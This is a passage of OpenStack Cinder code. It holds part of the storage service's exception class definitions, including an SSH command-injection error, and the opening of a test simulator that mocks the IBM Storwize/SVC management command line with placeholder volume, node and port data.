InvalidInput(Invalid):\n    message = _(\"Invalid input received\") + \": %(reason)s\"\n\n\nclass InvalidVolumeType(Invalid):\n    message = _(\"Invalid volume type\") + \": %(reason)s\"\n\n\nclass InvalidVolume(Invalid):\n    message = _(\"Invalid volume\") + \": %(reason)s\"\n\n\nclass InvalidContentType(Invalid):\n    message = _(\"Invalid content type %(content_type)s.\")\n\n\nclass InvalidHost(Invalid):\n    message = _(\"Invalid host\") + \": %(reason)s\"\n\n\n# Cannot be templated as the error syntax varies.\n# msg needs to be constructed when raised.\nclass InvalidParameterValue(Invalid):\n    message = _(\"%(err)s\")\n\n\nclass InvalidAuthKey(Invalid):\n    message = _(\"Invalid auth key\") + \": %(reason)s\"\n\n\nclass ServiceUnavailable(Invalid):\n    message = _(\"Service is unavailable at this time.\")\n\n\nclass ImageUnacceptable(Invalid):\n    message = _(\"Image %(image_id)s is unacceptable: %(reason)s\")\n\n\nclass DeviceUnavailable(Invalid):\n    message = _(\"The device in the path %(path)s is unavailable: %(reason)s\")\n\n\nclass InvalidUUID(Invalid):\n    message = _(\"Expected a uuid but received %(uuid)s.\")\n\n\nclass NotFound(CinderException):\n    message = _(\"Resource could not be found.\")\n    code = 404\n    safe = True\n\n\nclass PersistentVolumeFileNotFound(NotFound):\n    message = _(\"Volume %(volume_id)s persistence file could not be found.\")\n\n\nclass VolumeNotFound(NotFound):\n    message = _(\"Volume %(volume_id)s could not be found.\")\n\n\nclass SfAccountNotFound(NotFound):\n    message = _(\"Unable to locate account %(account_name)s on \"\n                \"Solidfire device\")\n\n\nclass VolumeNotFoundForInstance(VolumeNotFound):\n    message = _(\"Volume not found for instance %(instance_id)s.\")\n\n\nclass VolumeMetadataNotFound(NotFound):\n    message = _(\"Volume %(volume_id)s has no metadata with \"\n                \"key %(metadata_key)s.\")\n\n\nclass InvalidVolumeMetadata(Invalid):\n    message = _(\"Invalid metadata\") + \": %(reason)s\"\n\n\nclass InvalidVolumeMetadataSize(Invalid):\n    message = _(\"Invalid metadata size\") + \": %(reason)s\"\n\n\nclass SnapshotMetadataNotFound(NotFound):\n    message = _(\"Snapshot %(snapshot_id)s has no metadata with \"\n                \"key %(metadata_key)s.\")\n\n\nclass InvalidSnapshotMetadata(Invalid):\n    message = _(\"Invalid metadata\") + \": %(reason)s\"\n\n\nclass InvalidSnapshotMetadataSize(Invalid):\n    message = _(\"Invalid metadata size\") + \": %(reason)s\"\n\n\nclass VolumeTypeNotFound(NotFound):\n    message = _(\"Volume type %(volume_type_id)s could not be found.\")\n\n\nclass VolumeTypeNotFoundByName(VolumeTypeNotFound):\n    message = _(\"Volume type with name %(volume_type_name)s \"\n                \"could not be found.\")\n\n\nclass VolumeTypeExtraSpecsNotFound(NotFound):\n    message = _(\"Volume Type %(volume_type_id)s has no extra specs with \"\n                \"key %(extra_specs_key)s.\")\n\n\nclass SnapshotNotFound(NotFound):\n    message = _(\"Snapshot %(snapshot_id)s could not be found.\")\n\n\nclass VolumeIsBusy(CinderException):\n    message = _(\"deleting volume %(volume_name)s that has snapshot\")\n\n\nclass SnapshotIsBusy(CinderException):\n    message = _(\"deleting snapshot %(snapshot_name)s that has \"\n                \"dependent volumes\")\n\n\nclass ISCSITargetNotFoundForVolume(NotFound):\n    message = _(\"No target id found for volume %(volume_id)s.\")\n\n\nclass ISCSITargetCreateFailed(CinderException):\n    message = _(\"Failed to create iscsi target for volume %(volume_id)s.\")\n\n\nclass ISCSITargetAttachFailed(CinderException):\n    message = _(\"Failed to attach iSCSI target for volume %(volume_id)s.\")\n\n\nclass ISCSITargetRemoveFailed(CinderException):\n    message = _(\"Failed to remove iscsi target for volume %(volume_id)s.\")\n\n\nclass DiskNotFound(NotFound):\n    message = _(\"No disk at %(location)s\")\n\n\nclass InvalidImageRef(Invalid):\n    message = _(\"Invalid image href %(image_href)s.\")\n\n\nclass ImageNotFound(NotFound):\n    message = _(\"Image %(image_id)s could not be found.\")\n\n\nclass ServiceNotFound(NotFound):\n    message = _(\"Service %(service_id)s could not be found.\")\n\n\nclass HostNotFound(NotFound):\n    message = _(\"Host %(host)s could not be found.\")\n\n\nclass SchedulerHostFilterNotFound(NotFound):\n    message = _(\"Scheduler Host Filter %(filter_name)s could not be found.\")\n\n\nclass SchedulerHostWeigherNotFound(NotFound):\n    message = _(\"Scheduler Host Weigher %(weigher_name)s could not be found.\")\n\n\nclass HostBinaryNotFound(NotFound):\n    message = _(\"Could not find binary %(binary)s on host %(host)s.\")\n\n\nclass InvalidReservationExpiration(Invalid):\n    message = _(\"Invalid reservation expiration %(expire)s.\")\n\n\nclass InvalidQuotaValue(Invalid):\n    message = _(\"Change would make usage less than 0 for the following \"\n                \"resources: %(unders)s\")\n\n\nclass QuotaNotFound(NotFound):\n    message = _(\"Quota could not be found\")\n\n\nclass QuotaResourceUnknown(QuotaNotFound):\n    message = _(\"Unknown quota resources %(unknown)s.\")\n\n\nclass ProjectQuotaNotFound(QuotaNotFound):\n    message = _(\"Quota for project %(project_id)s could not be found.\")\n\n\nclass QuotaClassNotFound(QuotaNotFound):\n    message = _(\"Quota class %(class_name)s could not be found.\")\n\n\nclass QuotaUsageNotFound(QuotaNotFound):\n    message = _(\"Quota usage for project %(project_id)s could not be found.\")\n\n\nclass ReservationNotFound(QuotaNotFound):\n    message = _(\"Quota reservation %(uuid)s could not be found.\")\n\n\nclass OverQuota(CinderException):\n    message = _(\"Quota exceeded for resources: %(overs)s\")\n\n\nclass MigrationNotFound(NotFound):\n    message = _(\"Migration %(migration_id)s could not be found.\")\n\n\nclass MigrationNotFoundByStatus(MigrationNotFound):\n    message = _(\"Migration not found for instance %(instance_id)s \"\n                \"with status %(status)s.\")\n\n\nclass FileNotFound(NotFound):\n    message = _(\"File %(file_path)s could not be found.\")\n\n\nclass ClassNotFound(NotFound):\n    message = _(\"Class %(class_name)s could not be found: %(exception)s\")\n\n\nclass NotAllowed(CinderException):\n    message = _(\"Action not allowed.\")\n\n\n#TODO(bcwaldon): EOL this exception!\nclass Duplicate(CinderException):\n    pass\n\n\nclass KeyPairExists(Duplicate):\n    message = _(\"Key pair %(key_name)s already exists.\")\n\n\nclass VolumeTypeExists(Duplicate):\n    message = _(\"Volume Type %(id)s already exists.\")\n\n\nclass MigrationError(CinderException):\n    message = _(\"Migration error\") + \": %(reason)s\"\n\n\nclass MalformedRequestBody(CinderException):\n    message = _(\"Malformed message body: %(reason)s\")\n\n\nclass ConfigNotFound(NotFound):\n    message = _(\"Could not find config at %(path)s\")\n\n\nclass ParameterNotFound(NotFound):\n    message = _(\"Could not find parameter %(param)s\")\n\n\nclass PasteAppNotFound(NotFound):\n    message = _(\"Could not load paste app '%(name)s' from %(path)s\")\n\n\nclass NoValidHost(CinderException):\n    message = _(\"No valid host was found. %(reason)s\")\n\n\nclass WillNotSchedule(CinderException):\n    message = _(\"Host %(host)s is not up or doesn't exist.\")\n\n\nclass QuotaError(CinderException):\n    message = _(\"Quota exceeded\") + \": code=%(code)s\"\n    code = 413\n    headers = {'Retry-After': 0}\n    safe = True\n\n\nclass VolumeSizeExceedsAvailableQuota(QuotaError):\n    message = _(\"Requested volume or snapshot exceeds \"\n                \"allowed Gigabytes quota\")\n\n\nclass VolumeSizeExceedsQuota(QuotaError):\n    message = _(\"Maximum volume/snapshot size exceeded\")\n\n\nclass VolumeLimitExceeded(QuotaError):\n    message = _(\"Maximum number of volumes allowed (%(allowed)d) exceeded\")\n\n\nclass SnapshotLimitExceeded(QuotaError):\n    message = _(\"Maximum number of snapshots allowed (%(allowed)d) exceeded\")\n\n\nclass DuplicateSfVolumeNames(Duplicate):\n    message = _(\"Detected more than one volume with name %(vol_name)s\")\n\n\nclass Duplicate3PARHost(CinderException):\n    message = _(\"3PAR Host already exists: %(err)s.  %(info)s\")\n\n\nclass Invalid3PARDomain(CinderException):\n    message = _(\"Invalid 3PAR Domain: %(err)s\")\n\n\nclass VolumeTypeCreateFailed(CinderException):\n    message = _(\"Cannot create volume_type with \"\n                \"name %(name)s and specs %(extra_specs)s\")\n\n\nclass SolidFireAPIException(CinderException):\n    message = _(\"Bad response from SolidFire API\")\n\n\nclass SolidFireAPIDataException(SolidFireAPIException):\n    message = _(\"Error in SolidFire API response: data=%(data)s\")\n\n\nclass UnknownCmd(Invalid):\n    message = _(\"Unknown or unsupported command %(cmd)s\")\n\n\nclass MalformedResponse(Invalid):\n    message = _(\"Malformed response to command %(cmd)s: %(reason)s\")\n\n\nclass BadHTTPResponseStatus(CinderException):\n    message = _(\"Bad HTTP response status %(status)s\")\n\n\nclass FailedCmdWithDump(CinderException):\n    message = _(\"Operation failed with status=%(status)s. Full dump: %(data)s\")\n\n\nclass ZadaraServerCreateFailure(CinderException):\n    message = _(\"Unable to create server object for initiator %(name)s\")\n\n\nclass ZadaraServerNotFound(NotFound):\n    message = _(\"Unable to find server object for initiator %(name)s\")\n\n\nclass ZadaraVPSANoActiveController(CinderException):\n    message = _(\"Unable to find any active VPSA controller\")\n\n\nclass ZadaraAttachmentsNotFound(NotFound):\n    message = _(\"Failed to retrieve attachments for volume %(name)s\")\n\n\nclass ZadaraInvalidAttachmentInfo(Invalid):\n    message = _(\"Invalid attachment info for volume %(name)s: %(reason)s\")\n\n\nclass InstanceNotFound(NotFound):\n    message = _(\"Instance %(instance_id)s could not be found.\")\n\n\nclass VolumeBackendAPIException(CinderException):\n    message = _(\"Bad or unexpected response from the storage volume \"\n                \"backend API: %(data)s\")\n\n\nclass NfsException(CinderException):\n    message = _(\"Unknown NFS exception\")\n\n\nclass NfsNoSharesMounted(NotFound):\n    message = _(\"No mounted NFS shares found\")\n\n\nclass NfsNoSuitableShareFound(NotFound):\n    message = _(\"There is no share which can host %(volume_size)sG\")\n\n\nclass GlusterfsException(CinderException):\n    message = _(\"Unknown Gluster exception\")\n\n\nclass GlusterfsNoSharesMounted(NotFound):\n    message = _(\"No mounted Gluster shares found\")\n\n\nclass GlusterfsNoSuitableShareFound(NotFound):\n    message = _(\"There is no share which can host %(volume_size)sG\")\n\n\nclass GlanceMetadataExists(Invalid):\n    message = _(\"Glance metadata cannot be updated, key %(key)s\"\n                \" exists for volume id %(volume_id)s\")\n\n\nclass ImageCopyFailure(Invalid):\n    message = _(\"Failed to copy image to volume: %(reason)s\")\n\n\nclass BackupInvalidCephArgs(Invalid):\n    message = _(\"Invalid Ceph args provided for backup rbd operation\")\n\n\nclass BackupOperationError(Invalid):\n    message = _(\"An error has occurred during backup operation\")\n\n\nclass BackupRBDOperationFailed(Invalid):\n    message = _(\"Backup RBD operation failed\")\n\n\nclass BackupVolumeInvalidType(Invalid):\n    message = _(\"Backup volume %(volume_id)s type not recognised.\")\n\n\nclass BackupNotFound(NotFound):\n    message = _(\"Backup %(backup_id)s could not be found.\")\n\n\nclass InvalidBackup(Invalid):\n    message = _(\"Invalid backup: %(reason)s\")\n\n\nclass SwiftConnectionFailed(CinderException):\n    message = _(\"Connection to swift failed\") + \": %(reason)s\"\n\n\nclass TransferNotFound(NotFound):\n    message = _(\"Transfer %(transfer_id)s could not be found.\")\n\n\nclass VolumeMigrationFailed(CinderException):\n    message = _(\"Volume migration failed\") + \": %(reason)s\"\n\n\nclass ProtocolNotSupported(CinderException):\n    message = _(\"Connect to volume via protocol %(protocol)s not supported.\")\n\n\nclass SSHInjectionThreat(CinderException):\n    message = _(\"SSH command injection detected\") + \": %(command)s\"\n/n/n/ncinder/tests/test_storwize_svc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2013 IBM Corp.\n# Copyright 2012 OpenStack LLC.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n# Authors:\n#   Ronen Kat <ronenkat@il.ibm.com>\n#   Avishay Traeger <avishay@il.ibm.com>\n\n\"\"\"\nTests for the IBM Storwize family and SVC volume driver.\n\"\"\"\n\n\nimport random\nimport re\nimport socket\n\nfrom cinder.brick.initiator import connector\nfrom cinder import context\nfrom cinder import exception\nfrom cinder.openstack.common import excutils\nfrom cinder.openstack.common import log as logging\nfrom cinder import test\nfrom cinder import units\nfrom cinder import utils\nfrom cinder.volume import configuration as conf\nfrom cinder.volume.drivers import storwize_svc\nfrom cinder.volume import volume_types\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass StorwizeSVCFakeDB:\n    def __init__(self):\n        self.volume = None\n\n    def volume_get(self, context, vol_id):\n        return self.volume\n\n    def volume_set(self, vol):\n        self.volume = vol\n\n\nclass StorwizeSVCManagementSimulator:\n    def __init__(self, pool_name):\n        self._flags = {'storwize_svc_volpool_name': pool_name}\n        self._volumes_list = {}\n        self._hosts_list = {}\n        self._mappings_list = {}\n        self._fcmappings_list = {}\n        self._next_cmd_error = {\n            'lsportip': '',\n            'lsfabric': '',\n            'lsiscsiauth': '',\n            'lsnodecanister': '',\n            'mkvdisk': '',\n            'lsvdisk': '',\n            'lsfcmap': '',\n            'prestartfcmap': '',\n            'startfcmap': '',\n            'rmfcmap': '',\n            'lslicense': '',\n        }\n        self._errors = {\n            'CMMVC5701E': ('', 'CMMVC5701E No object ID was specified.'),\n            'CMMVC6035E': ('', 'CMMVC6035E The action failed as the '\n                               'object already exists.'),\n            'CMMVC5753E': ('', 'CMMVC5753E The specified object does not '\n                               'exist or is not a suitable candidate.'),\n            'CMMVC5707E': ('', 'CMMVC5707E Required parameters are missing.'),\n            'CMMVC6581E': ('', 'CMMVC6581E The command has failed because '\n                               'the maximum number of allowed iSCSI '\n                               'qualified names (IQNs) has been reached, '\n                               'or the IQN is already assigned or is not '\n                               'valid.'),\n            'CMMVC5754E': ('', 'CMMVC5754E The specified object does not '\n                               'exist, or the name supplied does not meet '\n                               'the naming rules.'),\n            'CMMVC6071E': ('', 'CMMVC6071E The VDisk-to-host mapping was '\n                               'not created because the VDisk is already '\n                               'mapped to a host.'),\n            'CMMVC5879E': ('', 'CMMVC5879E The VDisk-to-host mapping was '\n                               'not created because a VDisk is already '\n                               'mapped to this host with this SCSI LUN.'),\n            'CMMVC5840E': ('', 'CMMVC5840E The virtual disk (VDisk) was '\n                               'not deleted because it is mapped to a '\n                               'host or because it is part of a FlashCopy '\n                               'or Remote Copy mapping, or is involved in '\n                               'an image mode migrate.'),\n            'CMMVC6527E': ('', 'CMMVC6527E The name that you have entered '\n                               'is not valid. The name can contain letters, '\n                               'numbers, spaces, periods, dashes, and '\n                               'underscores. The name must begin with a '\n                               'letter or an underscore. The name must not '\n                               'begin or end with a space.'),\n            'CMMVC5871E': ('', 'CMMVC5871E The action failed because one or '\n                               'more of the configured port names is in a '\n                               'mapping.'),\n            'CMMVC5924E': ('', 'CMMVC5924E The FlashCopy mapping was not '\n                               'created because the source and target '\n                               'virtual disks (VDisks) are different sizes.'),\n            'CMMVC6303E': ('', 'CMMVC6303E The create failed because the '\n                               'source and target VDisks are the same.'),\n            'CMMVC7050E': ('', 'CMMVC7050E The command failed because at '\n                               'least one node in the I/O group does not '\n                               'support compressed VDisks.'),\n            # Catch-all for invalid state transitions:\n            'CMMVC5903E': ('', 'CMMVC5903E The FlashCopy mapping was not '\n                               'changed because the mapping or consistency '\n                               'group is another state.'),\n        }\n        self._transitions = {'begin': {'make': 'idle_or_copied'},\n                             'idle_or_copied': {'prepare': 'preparing',\n                                                'delete': 'end',\n                                                'delete_force': 'end'},\n                             'preparing': {'flush_failed': 'stopped',\n                                           'wait': 'prepared'},\n                             'end': None,\n                             'stopped': {'prepare': 'preparing',\n                                         'delete_force': 'end'},\n                             'prepared': {'stop': 'stopped',\n                                          'start': 'copying'},\n                             'copying': {'wait': 'idle_or_copied',\n                                         'stop': 'stopping'},\n                             # Assume the worst case where stopping->stopped\n                             # rather than stopping idle_or_copied\n                             'stopping': {'wait': 'stopped'},\n                             }\n\n    def _state_transition(self, function, fcmap):\n        if (function == 'wait' and\n                'wait' not in self._transitions[fcmap['status']]):\n            return ('', '')\n\n        if fcmap['status'] == 'copying' and function == 'wait':\n            if fcmap['copyrate'] != '0':\n                if fcmap['progress'] == '0':\n                    fcmap['progress'] = '50'\n                else:\n                    fcmap['progress'] = '100'\n                    fcmap['status'] = 'idle_or_copied'\n            return ('', '')\n        else:\n            try:\n                curr_state = fcmap['status']\n                fcmap['status'] = self._transitions[curr_state][function]\n                return ('', '')\n            except Exception:\n                return self._errors['CMMVC5903E']\n\n    # Find an unused ID\n    def _find_unused_id(self, d):\n        ids = []\n        for k, v in d.iteritems():\n            ids.append(int(v['id']))\n        ids.sort()\n        for index, n in enumerate(ids):\n            if n > index:\n                return str(index)\n        return str(len(ids))\n\n    # Check if name is valid\n    def _is_invalid_name(self, name):\n        if re.match(\"^[a-zA-Z_][\\w ._-]*$\", name):\n            return False\n        return True\n\n    # Convert argument string to dictionary\n    def _cmd_to_dict(self, arg_list):\n        no_param_args = [\n            'autodelete',\n            'autoexpand',\n            'bytes',\n            'compressed',\n            'force',\n            'nohdr',\n        ]\n        one_param_args = [\n            'chapsecret',\n            'cleanrate',\n            'copyrate',\n            'delim',\n            'filtervalue',\n            'grainsize',\n            'hbawwpn',\n            'host',\n            'iogrp',\n            'iscsiname',\n            'mdiskgrp',\n            'name',\n            'rsize',\n            'scsi',\n            'size',\n            'source',\n            'target',\n            'unit',\n            'easytier',\n            'warning',\n            'wwpn',\n        ]\n\n        # Handle the special case of lsnode which is a two-word command\n        # Use the one word version of the command internally\n        if arg_list[0] in ('svcinfo', 'svctask'):\n            if arg_list[1] == 'lsnode':\n                if len(arg_list) > 4:  # e.g. svcinfo lsnode -delim ! <node id>\n                    ret = {'cmd': 'lsnode', 'node_id': arg_list[-1]}\n                else:\n                    ret = {'cmd': 'lsnodecanister'}\n            else:\n                ret = {'cmd': arg_list[1]}\n            arg_list.pop(0)\n        else:\n            ret = {'cmd': arg_list[0]}\n\n        skip = False\n        for i in range(1, len(arg_list)):\n            if skip:\n                skip = False\n                continue\n            if arg_list[i][0] == '-':\n                if arg_list[i][1:] in no_param_args:\n                    ret[arg_list[i][1:]] = True\n                elif arg_list[i][1:] in one_param_args:\n                    ret[arg_list[i][1:]] = arg_list[i + 1]\n                    skip = True\n                else:\n                    raise exception.InvalidInput(\n                        reason=_('unrecognized argument %s') % arg_list[i])\n            else:\n                ret['obj'] = arg_list[i]\n        return ret\n\n    def _print_info_cmd(self, rows, delim=' ', nohdr=False, **kwargs):\n        \"\"\"Generic function for printing information.\"\"\"\n        if nohdr:\n            del rows[0]\n\n        for index in range(len(rows)):\n            rows[index] = delim.join(rows[index])\n        return ('%s' % '\\n'.join(rows), '')\n\n    def _print_info_obj_cmd(self, header, row, delim=' ', nohdr=False):\n        \"\"\"Generic function for printing information for a specific object.\"\"\"\n        objrows = []\n        for idx, val in enumerate(header):\n            objrows.append([val, row[idx]])\n\n        if nohdr:\n            for index in range(len(objrows)):\n                objrows[index] = ' '.join(objrows[index][1:])\n        for index in range(len(objrows)):\n            objrows[index] = delim.join(objrows[index])\n        return ('%s' % '\\n'.join(objrows), '')\n\n    def _convert_bytes_units(self, bytestr):\n        num = int(bytestr)\n        unit_array = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']\n        unit_index = 0\n\n        while num > 1024:\n            num = num / 1024\n            unit_index += 1\n\n        return '%d%s' % (num, unit_array[unit_index])\n\n    def _convert_units_bytes(self, num, unit):\n        unit_array = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']\n        unit_index = 0\n\n        while unit.lower() != unit_array[unit_index].lower():\n            num = num * 1024\n            unit_index += 1\n\n        return str(num)\n\n    def _cmd_lslicense(self, **kwargs):\n        rows = [None] * 3\n        rows[0] = ['used_compression_capacity', '0.08']\n        rows[1] = ['license_compression_capacity', '0']\n        if self._next_cmd_error['lslicense'] == 'no_compression':\n            self._next_cmd_error['lslicense'] = ''\n            rows[2] = ['license_compression_enclosures', '0']\n        else:\n            rows[2] = ['license_compression_enclosures', '1']\n        return self._print_info_cmd(rows=rows, **kwargs)\n\n    # Print mostly made-up stuff in the correct syntax\n    def _cmd_lssystem(self, **kwargs):\n        rows = [None] * 2\n        rows[0] = ['id', '0123456789ABCDEF']\n        rows[1] = ['name', 'storwize-svc-sim']\n        return self._print_info_cmd(rows=rows, **kwargs)\n\n    # Print mostly made-up stuff in the correct syntax, assume -bytes passed\n    def _cmd_lsmdiskgrp(self, **kwargs):\n        rows = [None] * 3\n        rows[0] = ['id', 'name', 'status', 'mdisk_count',\n                   'vdisk_count', 'capacity', 'extent_size',\n                   'free_capacity', 'virtual_capacity', 'used_capacity',\n                   'real_capacity', 'overallocation', 'warning',\n                   'easy_tier', 'easy_tier_status']\n        rows[1] = ['1', self._flags['storwize_svc_volpool_name'], 'online',\n                   '1', str(len(self._volumes_list)), '3573412790272',\n                   '256', '3529926246400', '1693247906775', '277841182',\n                   '38203734097', '47', '80', 'auto', 'inactive']\n        rows[2] = ['2', 'volpool2', 'online',\n                   '1', '0', '3573412790272', '256',\n                   '3529432325160', '1693247906775', '277841182',\n                   '38203734097', '47', '80', 'auto', 'inactive']\n        if 'obj' not in kwargs:\n            return self._print_info_cmd(rows=rows, **kwargs)\n        else:\n            if kwargs['obj'] == self._flags['storwize_svc_volpool_name']:\n                row = rows[1]\n            elif kwargs['obj'] == 'volpool2':\n                row = rows[2]\n            else:\n                return self._errors['CMMVC5754E']\n\n            objrows = []\n            for idx, val in enumerate(rows[0]):\n                objrows.append([val, row[idx]])\n\n            if 'nohdr' in kwargs:\n                for index in range(len(objrows)):\n                    objrows[index] = ' '.join(objrows[index][1:])\n\n            if 'delim' in kwargs:\n                for index in range(len(objrows)):\n                    objrows[index] = kwargs['delim'].join(objrows[index])\n\n            return ('%s' % '\\n'.join(objrows), '')\n\n    # Print mostly made-up stuff in the correct syntax\n    def _cmd_lsnodecanister(self, **kwargs):\n        rows = [None] * 3\n        rows[0] = ['id', 'name', 'UPS_serial_number', 'WWNN', 'status',\n                   'IO_group_id', 'IO_group_name', 'config_node',\n                   'UPS_unique_id', 'hardware', 'iscsi_name', 'iscsi_alias',\n                   'panel_name', 'enclosure_id', 'canister_id',\n                   'enclosure_serial_number']\n        rows[1] = ['1', 'node1', '', '123456789ABCDEF0', 'online', '0',\n                   'io_grp0',\n                   'yes', '123456789ABCDEF0', '100',\n                   'iqn.1982-01.com.ibm:1234.sim.node1', '', '01-1', '1', '1',\n                   '0123ABC']\n        rows[2] = ['2', 'node2', '', '123456789ABCDEF1', 'online', '0',\n                   'io_grp0',\n                   'no', '123456789ABCDEF1', '100',\n                   'iqn.1982-01.com.ibm:1234.sim.node2', '', '01-2', '1', '2',\n                   '0123ABC']\n\n        if self._next_cmd_error['lsnodecanister'] == 'header_mismatch':\n            rows[0].pop(2)\n            self._next_cmd_error['lsnodecanister'] = ''\n        if self._next_cmd_error['lsnodecanister'] == 'remove_field':\n            for row in rows:\n                row.pop(0)\n            self._next_cmd_error['lsnodecanister'] = ''\n\n        return self._print_info_cmd(rows=rows, **kwargs)\n\n    # Print information of every single node of SVC\n    def _cmd_lsnode(self, **kwargs):\n        node_infos = dict()\n        node_infos['1'] = r'''id!1\nname!node1\nport_id!500507680210C744\nport_status!active\nport_speed!8Gb\nport_id!500507680220C744\nport_status!active\nport_speed!8Gb\n'''\n        node_infos['2'] = r'''id!2\nname!node2\nport_id!500507680220C745\nport_status!active\nport_speed!8Gb\nport_id!500507680230C745\nport_status!inactive\nport_speed!N/A\n'''\n        node_id = kwargs.get('node_id', None)\n        stdout = node_infos.get(node_id, '')\n        return stdout, ''\n\n    # Print mostly made-up stuff in the correct syntax\n    def _cmd_lsportip(self, **kwargs):\n        if self._next_cmd_error['lsportip'] == 'ip_no_config':\n            self._next_cmd_error['lsportip'] = ''\n            ip_addr1 = ''\n            ip_addr2 = ''\n            gw = ''\n        else:\n            ip_addr1 = '1.234.56.78'\n            ip_addr2 = '1.234.56.79'\n            gw = '1.234.56.1'\n\n        rows = [None] * 17\n        rows[0] = ['id', 'node_id', 'node_name', 'IP_address', 'mask',\n                   'gateway', 'IP_address_6', 'prefix_6', 'gateway_6', 'MAC',\n                   'duplex', 'state', 'speed', 'failover']\n        rows[1] = ['1', '1', 'node1', ip_addr1, '255.255.255.0',\n                   gw, '', '', '', '01:23:45:67:89:00', 'Full',\n                   'online', '1Gb/s', 'no']\n        rows[2] = ['1', '1', 'node1', '', '', '', '', '', '',\n                   '01:23:45:67:89:00', 'Full', 'online', '1Gb/s', 'yes']\n        rows[3] = ['2', '1', 'node1', '', '', '', '', '', '',\n                   '01:23:45:67:89:01', 'Full', 'unconfigured', '1Gb/s', 'no']\n        rows[4] = ['2', '1', 'node1', '', '', '', '', '', '',\n                   '01:23:45:67:89:01', 'Full', 'unconfigured', '1Gb/s', 'yes']\n        rows[5] = ['3', '1', 'node1', '', '', '', '', '', '', '', '',\n                   'unconfigured', '', 'no']\n        rows[6] = ['3', '1', 'node1', '', '', '', '', '', '', '', '',\n                   'unconfigured', '', 'yes']\n        rows[7] = ['4', '1', 'node1', '', '', '', '', '', '', '', '',\n                   'unconfigured', '', 'no']\n        rows[8] = ['4', '1', 'node1', '', '', '', '', '', '', '', '',\n                   'unconfigured', '', 'yes']\n        rows[9] = ['1', '2', 'node2', ip_addr2, '255.255.255.0',\n                   gw, '', '', '', '01:23:45:67:89:02', 'Full',\n                   'online', '1Gb/s', 'no']\n        rows[10] = ['1', '2', 'node2', '', '', '', '', '', '',\n                    '01:23:45:67:89:02', 'Full', 'online', '1Gb/s', 'yes']\n        rows[11] = ['2', '2', 'node2', '', '', '', '', '', '',\n                    '01:23:45:67:89:03', 'Full', 'unconfigured', '1Gb/s', 'no']\n        rows[12] = ['2', '2', 'node2', '', '', '', '', '', '',\n                    '01:23:45:67:89:03', 'Full', 'unconfigured', '1Gb/s',\n                    'yes']\n        rows[13] = ['3', '2', 'node2', '', '', '', '', '', '', '', '',\n                    'unconfigured', '', 'no']\n        rows[14] = ['3', '2', 'node2', '', '', '', '', '', '', '', '',\n                    'unconfigured', '', 'yes']\n        rows[15] = ['4', '2', 'node2', '', '', '', '', '', '', '', '',\n                    'unconfigured', '', 'no']\n        rows[16] = ['4', '2', 'node2', '', '', '', '', '', '', '', '',\n                    'unconfigured', '', 'yes']\n\n        if self._next_cmd_error['lsportip'] == 'header_mismatch':\n            rows[0].pop(2)\n            self._next_cmd_error['lsportip'] = ''\n        if self._next_cmd_error['lsportip'] == 'remove_field':\n            for row in rows:\n                row.pop(1)\n            self._next_cmd_error['lsportip'] = ''\n\n        return self._print_info_cmd(rows=rows, **kwargs)\n\n    def _cmd_lsfabric(self, **kwargs):\n        host_name = kwargs['host'] if 'host' in kwargs else None\n        target_wwpn = kwargs['wwpn'] if 'wwpn' in kwargs else None\n        host_infos = []\n\n        for hk, hv in self._hosts_list.iteritems():\n            if not host_name or hv['host_name'] == host_name:\n                for mk, mv in self._mappings_list.iteritems():\n                    if mv['host'] == hv['host_name']:\n                        if not target_wwpn or target_wwpn in hv['wwpns']:\n                            host_infos.append(hv)\n                            break\n\n        if not len(host_infos):\n            return ('', '')\n\n        rows = []\n        rows.append(['remote_wwpn', 'remote_nportid', 'id', 'node_name',\n                     'local_wwpn', 'local_port', 'local_nportid', 'state',\n                     'name', 'cluster_name', 'type'])\n        for host_info in host_infos:\n            for wwpn in host_info['wwpns']:\n                rows.append([wwpn, '123456', host_info['id'], 'nodeN',\n                            'AABBCCDDEEFF0011', '1', '0123ABC', 'active',\n                            host_info['host_name'], '', 'host'])\n\n        if self._next_cmd_error['lsfabric'] == 'header_mismatch':\n            rows[0].pop(0)\n            self._next_cmd_error['lsfabric'] = ''\n        if self._next_cmd_error['lsfabric'] == 'remove_field':\n            for row in rows:\n                row.pop(0)\n            self._next_cmd_error['lsfabric'] = ''\n        return self._print_info_cmd(rows=rows, **kwargs)\n\n    # Create a vdisk\n    def _cmd_mkvdisk(self, **kwargs):\n        # We only save the id/uid, name, and size - all else will be made up\n        volume_info = {}\n        volume_info['id'] = self._find_unused_id(self._volumes_list)\n        volume_info['uid'] = ('ABCDEF' * 3) + ('0' * 14) + volume_info['id']\n\n        if 'name' in kwargs:\n            volume_info['name'] = kwargs['name'].strip('\\'\\'')\n        else:\n            volume_info['name'] = 'vdisk' + volume_info['id']\n\n        # Assume size and unit are given, store it in bytes\n        capacity = int(kwargs['size'])\n        unit = kwargs['unit']\n        volume_info['capacity'] = self._convert_units_bytes(capacity, unit)\n\n        if 'easytier' in kwargs:\n            if kwargs['easytier'] == 'on':\n                volume_info['easy_tier'] = 'on'\n            else:\n                volume_info['easy_tier'] = 'off'\n\n        if 'rsize' in kwargs:\n            # Fake numbers\n            volume_info['used_capacity'] = '786432'\n            volume_info['real_capacity'] = '21474816'\n            volume_info['free_capacity'] = '38219264'\n            if 'warning' in kwargs:\n                volume_info['warning'] = kwargs['warning'].rstrip('%')\n            else:\n                volume_info['warning'] = '80'\n            if 'autoexpand' in kwargs:\n                volume_info['autoexpand'] = 'on'\n            else:\n                volume_info['autoexpand'] = 'off'\n            if 'grainsize' in kwargs:\n                volume_info['grainsize'] = kwargs['grainsize']\n            else:\n                volume_info['grainsize'] = '32'\n            if 'compressed' in kwargs:\n                volume_info['compressed_copy'] = 'yes'\n            else:\n                volume_info['compressed_copy'] = 'no'\n        else:\n            volume_info['used_capacity'] = volume_info['capacity']\n            volume_info['real_capacity'] = volume_info['capacity']\n            